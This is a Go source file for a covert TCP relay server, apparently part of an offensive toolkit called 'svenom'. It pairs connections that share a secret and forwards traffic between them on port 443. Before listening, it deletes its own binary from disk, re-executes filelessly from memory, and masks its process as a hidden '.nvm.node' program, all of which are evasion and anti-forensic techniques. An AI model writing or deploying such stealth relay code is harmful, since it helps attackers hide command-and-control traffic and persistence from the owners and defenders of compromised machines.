package main

import (
	"bufio"
	"flag"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
)

var (
	listenAddr = flag.String("listen", ":443", "Address to listen")
	relayMode  = flag.Bool("relay", false, "Run as relay server")
)

var waitingPeers = struct {
	sync.Mutex
	m map[string]net.Conn
}{m: make(map[string]net.Conn)}

func main() {
	flag.Parse()

	if !*relayMode {
		log.Fatal("Use -relay flag to start relay server")
	}

	// Fileless execution
	self, err := os.ReadFile(os.Args[0])
	if err == nil {
		os.Remove(os.Args[0])
		if err := memfd.ExecuteInMemory(self, os.Args, os.Environ()); err != nil {
			log.Printf("memfd fallback: %v", err)
		} else {
			return
		}
	}

	masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -listen "+*listenAddr)

	ln, err := net.Listen("tcp", *listenAddr)
	if err != nil {
		log.Fatalf("Listen: %v", err)
	}
	log.Printf("Relay listening on %s", *listenAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	secret, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	secret = strings.TrimSpace(secret)

	waitingPeers.Lock()
	if peer, ok := waitingPeers.m[secret]; ok {
		delete(waitingPeers.m, secret)
		waitingPeers.Unlock()
		go io.Copy(peer, conn)
		io.Copy(conn, peer)
		peer.Close()
	} else {
		waitingPeers.m[secret] = conn
		waitingPeers.Unlock()
		defer func() {
			waitingPeers.Lock()
			delete(waitingPeers.m, secret)
			waitingPeers.Unlock()
		}()
		io.ReadAll(conn)
	}
}